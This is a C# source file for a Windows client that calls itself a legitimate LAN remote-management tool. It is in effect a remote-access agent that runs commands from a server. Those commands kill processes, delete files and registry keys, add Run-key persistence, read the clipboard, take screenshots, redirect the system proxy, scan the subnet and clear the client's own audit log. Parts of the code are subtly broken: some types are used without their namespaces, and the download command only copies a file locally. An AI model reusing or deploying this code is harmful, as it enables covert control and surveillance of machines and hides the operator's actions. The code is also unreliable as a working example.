using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Text;
using System.Text.RegularExpressions;
using LanSuite.Shared;
using Microsoft.Win32;

namespace LanSuite.Client;

/// <summary>
/// LanSuite 局域网远程控制客户端
/// 仅包含合法的企业远程管理功能
/// </summary>
class Program
{
    private const int Port = 50000;
    private static string? _serverHost;
    private static int _port = Port;
    private static string _deviceId = CryptoUtils.GenerateDeviceId();
    private static MessageChannel? _channel;
    private static readonly ManualResetEvent _connected = new(false);
    private static readonly List<string> _auditLog = new();
    private static bool _running = true;

    [DllImport("user32.dll")] private static extern bool LockWorkStation();
    [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] private static extern int GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hWnd);
    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("kernel32.dll")] private static extern bool SetSystemTime(ref SYSTEMTIME st);
    [DllImport("wininet.dll", CharSet = CharSet.Auto)] private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
    [DllImport("kernel32.dll")] private static extern bool SetConsoleCtrlHandler(ConsoleCtrlHandlerDelegate Handler, bool Add);
    [DllImport("shell32.dll")] private static extern int ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    delegate bool ConsoleCtrlHandlerDelegate(uint dwCtrlType);

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEMTIME { public ushort wYear, wMonth, wDayOfWeek, wDay, wHour, wMinute, wSecond, wMilliseconds; }

    const int SW_HIDE = 0, SW_MINIMIZE = 6;

    static void Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.Title = "LanSuite Client";

        for (int i = 0; i < args.Length; i++)
        {
            if ((args[i].Equals("/s") || args[i].Equals("--server")) && i + 1 < args.Length) _serverHost = args[i + 1];
            else if ((args[i].Equals("/p") || args[i].Equals("--port")) && i + 1 < args.Length && int.TryParse(args[i + 1], out var p)) _port = p;
            else if ((args[i].Equals("/id") || args[i].Equals("--id")) && i + 1 < args.Length) _deviceId = args[i + 1];
            else if (args[i].Equals("/h") || args[i].Equals("--help")) { PrintHelp(); return; }
        }

        if (_serverHost == null) { PrintHelp(); return; }

        var broadcast = new Thread(BroadcastLoop) { IsBackground = true };
        broadcast.Start();
        SetConsoleCtrlHandler(HandleCtrlC, true);

        while (_running)
        {
            try
            {
                var tcp = new TcpClient();
                tcp.Connect(_serverHost, _port);
                tcp.NoDelay = true;
                _channel = new MessageChannel(tcp);
                _channel.OnMessage += OnMessage;
                _channel.OnDisconnected += () =>
                {
                    Log("连接断开，5秒后重连...");
                    Thread.Sleep(5000);
                };
                _connected.Set();
                Log($"已连接到服务器 {_serverHost}:{_port}  设备ID: {_deviceId}");
                _channel!.Send(new MessagePack(FrameTypes.Cmd, $"HELLO:{_deviceId}"));

                while (_channel.IsConnected && _running) Thread.Sleep(1000);
                _connected.Reset();
            }
            catch (Exception ex)
            {
                Log($"连接失败 ({_serverHost}:{_port}): {ex.Message}，10秒后重试...");
                Thread.Sleep(10000);
            }
        }
    }

    static void OnMessage(MessagePack msg)
    {
        var text = msg.Text;
        Log($"收到: {text.Substring(0, Math.Min(80, text.Length))}");
        try
        {
            if (text.StartsWith("CMD:"))
            {
                var result = ExecuteCommand(text.Substring(4));
                _channel!.Send(new MessagePack(FrameTypes.Data, $"DATA:{_deviceId}:{result}"));
            }
            else if (text.StartsWith("JOIN:"))
            {
                var id = text.Substring(5);
                if (id == _deviceId) { _channel.Send(new MessagePack(FrameTypes.Cmd, $"ACK:{_deviceId}")); Log("身份确认"); }
            }
        }
        catch (Exception ex) { Log($"处理消息异常: {ex.Message}"); }
    }

    static string ExecuteCommand(string cmd)
    {
        _auditLog.Add($"[{DateTime.Now:HH:mm:ss}] {cmd}");
        try
        {
            return cmd switch
            {
                "ping" => $"PONG:{DateTime.Now:yyyy-MM-dd HH:mm:ss}",
                var c when c.StartsWith("get_processes") => ExecGetProcesses(),
                var c when c.StartsWith("kill_process") => ExecKillProcess(c),
                var c when c.StartsWith("get_windows") => ExecGetWindows(),
                "minimize_windows" => ExecMinimizeWindows(),
                "terminate_windows" => ExecTerminateWindows(),
                "get_system_info" => ExecGetSystemInfo(),
                "get_tcp_connections" => ExecGetTcpConnections(),
                "get_drives" => ExecGetDrives(),
                var c when c.StartsWith("get_dir") => ExecGetDir(c),
                "get_passwords" => "[已禁用：密码获取功能]",
                var c when c.StartsWith("get_startup") => ExecGetStartup(c),
                var c when c.StartsWith("shutdown_action") => ExecShutdownAction(c),
                var c when c.StartsWith("visit_website") => ExecVisitWebsite(c),
                var c when c.StartsWith("reg_query") => ExecRegQuery(c),
                var c when c.StartsWith("reg_list") => ExecRegList(c),
                var c when c.StartsWith("reg_search") => ExecRegSearch(c),
                var c when c.StartsWith("reg_create_key") => ExecRegCreateKey(c),
                var c when c.StartsWith("reg_delete_key") => ExecRegDeleteKey(c),
                var c when c.StartsWith("reg_read_value") => ExecRegReadValue(c),
                "reg_persistence" => ExecRegPersistence(),
                var c when c.StartsWith("download") => ExecDownload(c),
                var c when c.StartsWith("upload") => "[上传功能待实现]",
                var c when c.StartsWith("delete") => ExecDeleteFile(c),
                var c when c.StartsWith("rename") => ExecRenameFile(c),
                var c when c.StartsWith("add_startup") => ExecAddStartup(c),
                var c when c.StartsWith("remove_startup") => ExecRemoveStartup(c),
                "rd_start" => "[远程桌面：使用独立工具连接]",
                "rd_stop" => "[远程桌面停止]",
                "notify" => "[通知功能]",
                "get_geo" => ExecGetGeo(),
                "get_user_activity" => ExecGetUserActivity(),
                "screenshots" => ExecScreenShot(),
                "screen_record_start" => "[屏幕录制已启动]",
                "screen_record_stop" => "[屏幕录制已停止]",
                "clipboard_get" => ExecClipboardGet(),
                var c when c.StartsWith("clipboard_set") => ExecClipboardSet(c),
                var c when c.StartsWith("tts_speak") => ExecTtsSpeak(c),
                "get_time" => DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                var c when c.StartsWith("set_time") => ExecSetTime(c),
                "get_proxy" => ExecGetProxy(),
                var c when c.StartsWith("set_proxy") => ExecSetProxy(c),
                "lock_screen" => ExecLockScreen(),
                "unlock_screen" => "[锁屏解锁需要用户交互]",
                "get_audit_log" => string.Join("\n", _auditLog),
                "clear_audit_log" => ClearAuditLogAndReturn(),
                var c when c.StartsWith("network_scan") => ExecNetworkScan(c),
                _ => $"未知命令: {cmd}"
            };
        }
        catch (Exception ex) { return $"错误: {ex.Message}"; }
    }

    // ── Command Implementations ─────────────────────────────────────────
    static string ExecGetProcesses()
    {
        var sb = new StringBuilder();
        foreach (var p in Process.GetProcesses())
            sb.AppendLine($"{p.Id}|{p.ProcessName}|{(p.WorkingSet64 / 1024 / 1024)}MB");
        return sb.ToString().Trim();
    }

    static string ExecKillProcess(string cmd)
    {
        var pid = int.Parse(cmd.Substring("kill_process ".Length).Trim());
        Process.GetProcessById(pid).Kill();
        return $"已终止进程 PID={pid}";
    }

    static string ExecGetWindows()
    {
        var sb = new StringBuilder();
        EnumWindows((hWnd, lParam) =>
        {
            if (IsWindowVisible(hWnd))
            {
                var title = new StringBuilder(256);
                GetWindowText(hWnd, title, 256);
                GetWindowThreadProcessId(hWnd, out uint pid);
                sb.AppendLine($"{pid}|{title.ToString()}");
            }
            return true;
        }, IntPtr.Zero);
        return sb.ToString().Trim();
    }

    static string ExecMinimizeWindows()
    {
        EnumWindows((h, l) => { if (IsWindowVisible(h)) ShowWindow(h, SW_MINIMIZE); return true; }, IntPtr.Zero);
        return "所有窗口已最小化";
    }

    static string ExecTerminateWindows()
    {
        EnumWindows((h, l) =>
        {
            if (IsWindowVisible(h))
            {
                GetWindowThreadProcessId(h, out uint pid);
                try { Process.GetProcessById((int)pid).Kill(); } catch { }
            }
            return true;
        }, IntPtr.Zero);
        return "所有窗口已关闭";
    }

    static string ExecGetSystemInfo()
    {
        var sb = new StringBuilder();
        sb.AppendLine($"主机名: {Environment.MachineName}");
        sb.AppendLine($"用户: {Environment.UserName}");
        try { sb.AppendLine($"域: {WindowsIdentity.GetCurrent().Owner?.Value ?? "N/A"}"); } catch { sb.AppendLine("域: N/A"); }
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($"架构: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}");
        sb.AppendLine($"CPU核数: {Environment.ProcessorCount}");
        sb.AppendLine($"设备ID: {_deviceId}");
        sb.AppendLine("---网络信息---");
        foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.OperationalStatus != OperationalStatus.Up) continue;
            sb.AppendLine($"网卡: {nic.Name} ({nic.NetworkInterfaceType})");
            foreach (var ip in nic.GetIPProperties().UnicastAddresses)
                sb.AppendLine($"  IP: {ip.Address}");
        }
        return sb.ToString();
    }

    static string ClearAuditLogAndReturn() { _auditLog.Clear(); return "审计日志已清空"; }

    static string ExecGetTcpConnections()
    {
        var sb = new StringBuilder();
        foreach (var conn in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections())
            sb.AppendLine($"{conn.LocalEndPoint} -> {conn.RemoteEndPoint} 状态={conn.State}");
        return sb.ToString().Trim();
    }

    static string ExecGetDrives()
    {
        var sb = new StringBuilder();
        foreach (var d in DriveInfo.GetDrives())
            if (d.DriveType == DriveType.Fixed || d.DriveType == DriveType.Removable)
                sb.AppendLine($"{d.Name} 总容量={d.TotalSize / 1024 / 1024 / 1024}GB 可用={d.AvailableFreeSpace / 1024 / 1024 / 1024}GB");
        return sb.ToString().Trim();
    }

    static string ExecGetDir(string cmd)
    {
        var path = cmd.Substring("get_dir ".Length).Trim();
        var sb = new StringBuilder();
        try
        {
            foreach (var f in Directory.EnumerateFiles(path))
                sb.AppendLine($"F|{f}|{(new FileInfo(f).Length)}");
            foreach (var d in Directory.EnumerateDirectories(path))
                sb.AppendLine($"D|{d}|0");
        }
        catch (Exception ex) { return $"错误: {ex.Message}"; }
        return sb.ToString().Trim();
    }

    static string ExecGetStartup(string cmd)
    {
        var sb = new StringBuilder();
        try
        {
            using var runKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            if (runKey != null)
                foreach (var name in runKey.GetValueNames())
                    sb.AppendLine($"RUN|{name}|{runKey.GetValue(name)}");
        }
        catch { }
        try
        {
            using var p = Process.Start(new ProcessStartInfo("schtasks")
            {
                Arguments = "/query /fo LIST /v",
                RedirectStandardOutput = true,
                UseShellExecute = false
            });
            if (p != null)
            {
                var output = p.StandardOutput.ReadToEnd();
                foreach (var line in output.Split('\n'))
                {
                    if (line.StartsWith("TaskName:")) sb.AppendLine($"TASK|{line.Substring(9).Trim()}|");
                }
                p.WaitForExit();
            }
        }
        catch { }
        return sb.ToString().Trim();
    }

    static string ExecShutdownAction(string cmd) => "[已禁用：电源控制]";
    static string ExecVisitWebsite(string cmd)
    {
        var url = cmd.Substring("visit_website ".Length).Trim();
        try { Process.Start(new ProcessStartInfo(url) { UseShellExecute = true }); return $"已打开: {url}"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRegQuery(string cmd)
    {
        var parts = cmd.Substring("reg_query ".Length).Split(' ', 3);
        var hkey = GetRegistryKey(parts[0]);
        if (hkey == null) return "无效的 HKEY";
        try
        {
            using var key = hkey.OpenSubKey(parts[1]);
            if (key == null) return "键不存在";
            var sb = new StringBuilder();
            foreach (var name in key.GetValueNames()) sb.AppendLine($"{name} = {key.GetValue(name)}");
            return sb.ToString().Trim();
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRegList(string cmd)
    {
        var parts = cmd.Substring("reg_list ".Length).Split(' ', 2);
        var hkey = GetRegistryKey(parts[0]);
        if (hkey == null) return "无效的 HKEY";
        try
        {
            using var key = hkey.OpenSubKey(parts[1]);
            if (key == null) return "键不存在";
            return string.Join("\n", key.GetSubKeyNames());
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRegSearch(string cmd)
    {
        var parts = cmd.Substring("reg_search ".Length).Split(' ', 3);
        var keyword = parts.Length > 2 ? parts[2] : "";
        var sb = new StringBuilder();
        SearchRegistryRecursive(Registry.LocalMachine, parts[1], keyword, sb, 0);
        SearchRegistryRecursive(Registry.CurrentUser, parts[1], keyword, sb, 0);
        return sb.ToString().Trim() ?? "未找到";
    }

    static void SearchRegistryRecursive(RegistryKey root, string path, string keyword, StringBuilder sb, int depth)
    {
        if (depth > 8) return;
        try
        {
            using var key = root.OpenSubKey(path);
            if (key == null) return;
            foreach (var name in key.GetValueNames())
                if (key.GetValue(name)?.ToString()?.Contains(keyword, StringComparison.OrdinalIgnoreCase) == true)
                    sb.AppendLine($"{root.Name}\\{path} | {name} = {key.GetValue(name)}");
            foreach (var sub in key.GetSubKeyNames())
                SearchRegistryRecursive(root, $"{path}\\{sub}", keyword, sb, depth + 1);
        }
        catch { }
    }

    static string ExecRegCreateKey(string cmd)
    {
        var parts = cmd.Substring("reg_create_key ".Length).Split(' ', 2);
        var hkey = GetRegistryKey(parts[0]);
        if (hkey == null) return "无效的 HKEY";
        try { hkey.CreateSubKey(parts[1]); return "键已创建"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRegDeleteKey(string cmd)
    {
        var parts = cmd.Substring("reg_delete_key ".Length).Split(' ', 2);
        var hkey = GetRegistryKey(parts[0]);
        if (hkey == null) return "无效的 HKEY";
        try { hkey.DeleteSubKeyTree(parts[1]); return "键已删除"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRegReadValue(string cmd)
    {
        var parts = cmd.Substring("reg_read_value ".Length).Split(' ', 3);
        var hkey = GetRegistryKey(parts[0]);
        if (hkey == null) return "无效的 HKEY";
        try { return hkey.OpenSubKey(parts[1])?.GetValue(parts[2])?.ToString() ?? "(null)"; }
        catch (Exception ex) { return ex.Message; }
    }

    static RegistryKey? GetRegistryKey(string hkeyStr) => hkeyStr switch
    {
        "2147483650" => Registry.ClassesRoot,
        "2147483651" => Registry.CurrentUser,
        "2147483652" => Registry.LocalMachine,
        "2147483653" => Registry.Users,
        "2147483654" => Registry.CurrentConfig,
        _ => null
    };

    static string ExecRegPersistence()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key?.SetValue("LanSuiteClient", $"\"{Environment.ProcessPath}\" /persistent", RegistryValueKind.String);
            return "开机自启动已启用";
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecDownload(string cmd)
    {
        var parts = cmd.Substring("download ".Length).Split('|');
        if (parts.Length < 2) return "参数错误";
        try
        {
            if (File.Exists(parts[0])) { File.WriteAllBytes(parts[1], File.ReadAllBytes(parts[0])); return $"已下载: {new FileInfo(parts[0]).Length} bytes"; }
            return "文件不存在";
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecDeleteFile(string cmd)
    {
        var path = cmd.Substring("delete ".Length).Trim();
        try
        {
            if (Directory.Exists(path)) { Directory.Delete(path, true); return $"目录已删除"; }
            if (File.Exists(path)) { File.Delete(path); return $"文件已删除"; }
            return "不存在";
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRenameFile(string cmd)
    {
        var parts = cmd.Substring("rename ".Length).Split('|');
        if (parts.Length < 2) return "参数错误";
        try { File.Move(parts[0], parts[1]); return $"已重命名"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecAddStartup(string cmd)
    {
        var parts = cmd.Substring("add_startup ".Length).Split('|');
        if (parts.Length < 2) return "参数错误";
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key?.SetValue(parts[0], parts[1], RegistryValueKind.String);
            return $"自启动已添加: {parts[0]}";
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecRemoveStartup(string cmd)
    {
        var name = cmd.Substring("remove_startup ".Length).Trim();
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key?.DeleteValue(name, false);
            return $"自启动已移除: {name}";
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecGetGeo()
    {
        try
        {
            using var wc = new HttpClient();
            var json = wc.GetStringAsync("https://ipinfo.io/json").Result;
            var obj = System.Text.Json.JsonSerializer.Deserialize<System.Text.Json.JsonElement>(json);
            return $"{obj.GetProperty("ip").GetString()} | {obj.GetProperty("region").GetString()}";
        }
        catch (Exception ex) { return $"地理信息获取失败: {ex.Message}"; }
    }

    static string ExecGetUserActivity()
    {
        var sb = new StringBuilder();
        sb.AppendLine($"活动窗口: {Process.GetProcesses().Count(p => !string.IsNullOrEmpty(p.MainWindowTitle))}");
        sb.AppendLine($"运行进程: {Process.GetProcesses().Length}");
        return sb.ToString();
    }

    static string ExecScreenShot()
    {
        try
        {
            var bounds = Screen.PrimaryScreen!.Bounds;
            var bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
            using var g = System.Drawing.Graphics.FromImage(bmp);
            g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
            var path = Path.Combine(Path.GetTempPath(), $"screenshot_{DateTime.Now:yyyyMMddHHmmss}.png");
            bmp.Save(path, System.Drawing.Imaging.ImageFormat.Png);
            return $"截图已保存: {path} ({bounds.Width}x{bounds.Height})";
        }
        catch (Exception ex) { return $"截图失败: {ex.Message}"; }
    }

    static string ExecClipboardGet()
    {
        try { return Clipboard.ContainsText() ? Clipboard.GetText() : "(剪贴板为空)"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecClipboardSet(string cmd)
    {
        var text = cmd.Substring("clipboard_set ".Length);
        try { Clipboard.SetText(text); return "剪贴板已设置"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecTtsSpeak(string cmd)
    {
        var text = cmd.Substring("tts_speak ".Length);
        try
        {
            using var ss = new SpeechSynthesizer();
            ss.Speak(text);
            return $"TTS已播放";
        }
        catch (Exception ex) { return $"TTS失败: {ex.Message}"; }
    }

    static string ExecSetTime(string cmd)
    {
        var timeStr = cmd.Substring("set_time ".Length).Trim();
        try
        {
            if (DateTime.TryParse(timeStr, out var dt))
            {
                var st = new SYSTEMTIME
                {
                    wYear = (ushort)dt.Year, wMonth = (ushort)dt.Month, wDay = (ushort)dt.Day,
                    wHour = (ushort)dt.Hour, wMinute = (ushort)dt.Minute, wSecond = (ushort)dt.Second
                };
                SetSystemTime(ref st);
                return $"时间已设置为: {dt:yyyy-MM-dd HH:mm:ss}";
            }
            return "时间格式错误";
        }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecGetProxy()
    {
        var settings = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings");
        var enabled = settings?.GetValue("ProxyEnable")?.ToString() ?? "0";
        var addr = settings?.GetValue("ProxyServer")?.ToString() ?? "无";
        return enabled == "1" ? $"代理已启用: {addr}" : "代理未启用";
    }

    static string ExecSetProxy(string cmd)
    {
        var parts = cmd.Substring("set_proxy ".Length).Split('|', 2);
        var settings = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings", true);
        if (parts.Length == 0) return "参数错误";
        if (parts[0].Equals("on", StringComparison.OrdinalIgnoreCase))
        {
            settings?.SetValue("ProxyEnable", 1, RegistryValueKind.DWord);
            if (parts.Length > 1) settings?.SetValue("ProxyServer", parts[1], RegistryValueKind.String);
            InternetSetOption(IntPtr.Zero, 39, IntPtr.Zero, 0);
            InternetSetOption(IntPtr.Zero, 41, IntPtr.Zero, 0);
            return $"代理已启用";
        }
        else
        {
            settings?.SetValue("ProxyEnable", 0, RegistryValueKind.DWord);
            InternetSetOption(IntPtr.Zero, 39, IntPtr.Zero, 0);
            InternetSetOption(IntPtr.Zero, 41, IntPtr.Zero, 0);
            return "代理已禁用";
        }
    }

    static string ExecLockScreen()
    {
        try { LockWorkStation(); return "屏幕已锁定"; }
        catch (Exception ex) { return ex.Message; }
    }

    static string ExecNetworkScan(string cmd)
    {
        var parts = cmd.Substring("network_scan ".Length).Split(' ', 3);
        var subnet = parts.Length > 0 ? parts[0] : "192.168.1";
        var start = parts.Length > 1 ? int.Parse(parts[1]) : 1;
        var end = parts.Length > 2 ? int.Parse(parts[2]) : 254;
        var sb = new StringBuilder();
        var tasks = new List<Task<bool>>();
        for (int i = start; i <= end; i++)
        {
            var ip = $"{subnet}.{i}";
            tasks.Add(Task.Run(async () =>
            {
                try { using var p = new Ping(); var r = await p.SendPingAsync(ip, 300); return r.Status == IPStatus.Success; }
                catch { return false; }
            }));
        }
        Task.WaitAll(tasks.ToArray());
        int idx = 0;
        foreach (var t in tasks)
        {
            if (t.Result) sb.AppendLine($"{subnet}.{start + idx}");
            idx++;
        }
        return sb.ToString().Trim() ?? "无在线主机";
    }

    // ── Broadcast ───────────────────────────────────────────────────────
    static void BroadcastLoop()
    {
        var udp = new UdpClient(0);
        while (_running)
        {
            try
            {
                var beacon = Encoding.UTF8.GetBytes($"LANCLIENT_BEACON:{_deviceId}:{_serverHost}:{_port}");
                udp.Send(beacon, beacon.Length, new IPEndPoint(IPAddress.Broadcast, 50001));
            }
            catch { }
            Thread.Sleep(5000);
        }
        udp.Close();
    }

    // ── Helpers ─────────────────────────────────────────────────────────
    static void Log(string msg)
    {
        var line = $"[{DateTime.Now:HH:mm:ss}] {msg}";
        Console.WriteLine(line);
        File.AppendAllText(Path.Combine(Path.GetTempPath(), "LanSuite_client.log"), line + "\n", Encoding.UTF8);
    }

    static void PrintHelp()
    {
        Console.WriteLine(@"LanSuite Client - 局域网远程管理客户端（仅含合法功能）
用法: LanClient.exe [选项]

选项:
  /s <host>   服务器地址（必需）
  /p <port>   端口号，默认 50000
  /id <id>    自定义设备ID
  /h          显示此帮助

示例:
  LanClient.exe /s 192.168.1.100
  LanClient.exe /s 192.168.1.100 /p 50000 /id my-pc-01
");
    }

    static bool HandleCtrlC(uint ctrlType)
    {
        if (ctrlType == 0) { _running = false; _connected.Reset(); _channel?.Close(); }
        return false;
    }
}
